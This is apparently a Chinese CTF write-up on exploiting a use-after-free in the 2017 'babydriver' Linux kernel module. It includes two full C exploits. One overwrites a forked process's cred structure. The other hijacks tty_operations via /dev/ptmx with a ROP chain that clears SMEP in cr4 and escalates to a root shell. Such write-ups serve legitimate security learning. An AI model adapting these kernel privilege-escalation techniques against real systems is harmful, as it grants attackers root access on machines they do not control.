---
layout: post
title: Linux  Kernel  Pwn  UAF
description: 学习Linux Kernel PWN 的UAF漏洞
categories:  Linux-Kernel-Pwn
---



<!-- more -->

# 0x01 背景知识

**UAF漏洞**：UAF 漏洞是当我们 free 掉某个指针变量所指向的堆块的时候，未将该指针变量置0，导致该指针依然指着该堆块地址，当我们引用该指针的话，也就引用该指针所所指向的地址。这个漏洞对于开发者很容易忽略，但威力非常强大

**条件竞争**：在多线程的环境下，当多个线程同时访问某一个共享代码、变量或文件的时候，就有可能发生条件竞争的漏洞，利用该漏洞可以产生意想不到的效果，不过有时候需要碰撞该漏洞才行，有一定失败几率。（在linux kernel pwn里面一般开了多线程就很有可能是利用条件竞争）

**cred**：当我们fork一个新的进程的时候会产生cred结构体，在task_struct中大小为0xa8，注意当cred的uid,gid为0的话，我们就提权成功

**ptmx**:当我们open("/dev/ptmx")的时候，会分配一个tty_operation的结构体,覆盖该结构体可以将控制流劫持到我们的代码中

 **cr4**：控制寄存器,功能之一开启关闭smep和smap保护，只要将cr4寄存器对应SMAP、SMEP保护位置为0即可关闭对应保护，常用mov,cr4,0x6f0

# 0x02 2017国赛 babydriver
#### 保护分析
只开启了 nx 保护
 ![](/images/character2/UAF1.png)
只开启smep，不能ret2usr
 ![](/images/character2/UAF2.png)
#### 逻辑分析
**ioctl**：kfree 掉device_buf,kmalloc用户指定大小的堆块
 ![](/images/character2/UAF3.png)
**babywrite**：从用户的buf里面写入到device_buf,大小要小于堆块的大小
 ![](/images/character2/UAF4.png)
**babyread **：将device_buf读入到用户指定的buf
![](/images/character2/UAF5.png)
 **babyrelease**:kfree 掉指定的 device_buf,但没有置0，UAF 漏洞
 ![](/images/character2/UAF6.png)

# 0x03 编写EXP
EXP思路1：
1.fd1,fd2打开device
2.fd1用ioctl 让 device 去 malloc 0xa8大小的堆块后free掉
3.fork一个新的进程
4.用fd2将device_buf全都置0
5.执行system('/bin/sh')

这里很多人可能看不明白3-5，详细讲下：linux kernel使用slab分配器来分配堆块，就像fastbin的后进先出一样，当我们fork一个新的进程后，会malloc一个0xa8大小的cred的结构体，此时slab会找到device_buf对应的堆块地址并分配给cred，只要我们用uaf将这个cred对应的uid，gid设置为0，则该进程对应的权限即为root权限，然后执行system("/bin/sh")就会得到shell了

exp代码如下：
一些编写exp的技巧我已写在上一篇文章中

```
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
int main(){
    int fd1,fd2,id;
    char cred[0xa8] = {0};
    fd1 = open("dev/babydev",O_RDWR);
    fd2 = open("dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0xa8);
    close(fd1);
    id = fork();
    if(id == 0){
        write(fd2,cred,28);
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(id < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}

```
EXP思路2:
关闭cr4，然后ret2usr
1.fd1,fd2打开device
2.fd1用ioctl 让 device 去 malloc 0x2e0大小的堆块后free掉
3.fd3打开ptmx创建tty_struct到device_buf的地址
4.fd2读取tty_struct到用户的buf中
5.利用uaf，让fd2的重写tty_struct，将里面的tty_operation劫持到我们伪造的fake_tty_operation，fake_tty_operation放入rop，使用write的时候即可调用rop
6.fd3执行write，调用tty_operation[3]，这里放入mov,rsp,rax执行栈劫持，rax是我们fake_tty_opeartion的结构体,就可以实现rop了
 ![](/images/character2/UAF7.png)

exp代码如下:

```
//poc.c
//gcc poc.c -o poc -w -static
#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr = 0xffffffff810a1420;
size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
void* fake_tty_opera[30];
 
void shell(){
    system("/bin/sh");
}
 
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}
 
void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
 
int main(){
    int fd1,fd2,fd3,i=0;
    size_t fake_tty_struct[4] = {0};
    size_t rop[20]={0};
    save_stats();
 
    rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
 
    for(i = 0; i < 30; i++)
    {
        fake_tty_opera[i] = 0xffffffff8181bfc5; //pop rax,pop rbp,ret
    }
    ////pop rax; pop rbp; ret;
    fake_tty_opera[0] = 0xffffffff810635f5;     
    fake_tty_opera[1] = (size_t)rop;

    //当调用write时，就会指向3，此时mov rsp,rax ; dec ebx ; ret
    //执行完后，rsp=fake_tty_opera[0],就会执行从我们构造的栈，执行了。
    fake_tty_opera[3] = 0xffffffff8181bfC5;    
    fake_tty_opera[7] = 0xffffffff8181bfc5; 
 
    fd1 = open("/dev/babydev",O_RDWR);
    fd2 = open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0x2e0);
    close(fd1);
    fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_opera;
    write(fd2,fake_tty_struct, 32);
    write(fd3,"cc-sir",6);                      //触发rop
    return 0;
}

```
# 0x04 总结
Linux Kernel Pwn不只是commit_creds(prepare_kernel_cred(0))这一条路，条条道路通罗马，要想对Linux Kernel完全渗透利用，必须要对Linux操作系统和内核源码理想透彻

题目下载地址：https://github.com/Vinadiak/LinuxKernelPwn/tree/master/2017%20babydriver
